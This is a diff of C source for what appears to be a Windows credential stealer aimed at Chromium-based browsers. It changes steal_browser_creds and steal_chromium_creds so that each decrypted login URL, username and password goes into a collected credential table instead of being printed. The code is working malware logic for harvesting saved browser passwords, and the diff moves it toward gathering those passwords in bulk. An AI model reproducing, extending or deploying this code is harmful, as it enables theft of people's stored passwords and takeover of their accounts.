@@ -223,7 +223,7 @@ static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
 }
 
 // Steals credentials for a singular `browser`
-static int steal_browser_creds(BrowserInfo browser) {
+static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD32 * indexCredTab) {
   // login data contains each logins with the password encrypted and other
   // attributes in clear text
   PWSTR loginDataPath;
@@ -283,10 +283,13 @@ static int steal_browser_creds(BrowserInfo browser) {
   }
 
   for (int i = 0; i < credentialsCount; i++) {
-    printf("======LOGIN %d======\n", i + 1);
-    printCredential(credentials[i]);
+    if (*indexCredTab < CRED_SIZE){
+      credTab[*indexCredTab].url = strdup(credentials[i].url);
+      credTab[*indexCredTab].username = strdup(credentials[i].username);
+      credTab[*indexCredTab].password = strdup(credentials[i].password);
+      (*indexCredTab)++;
+    }
   }
-  printf("====================\n");
 
   free_credentials(credentials, credentialsCount);
   free_logins(logins, loginsCount);  // allocated in chrmm_retrieve_logins
@@ -299,9 +302,9 @@ static int steal_browser_creds(BrowserInfo browser) {
   return EXIT_SUCCESS;
 }
 
-int steal_chromium_creds() {
+int steal_chromium_creds(Credential * credTab, DWORD32 * indexCredTab) {
   for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
-    if (steal_browser_creds(browsers[i]) != EXIT_SUCCESS) {
+    if (steal_browser_creds(browsers[i], credTab, indexCredTab) != EXIT_SUCCESS) {
       fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n",
                browsers[i].browserName);
     }
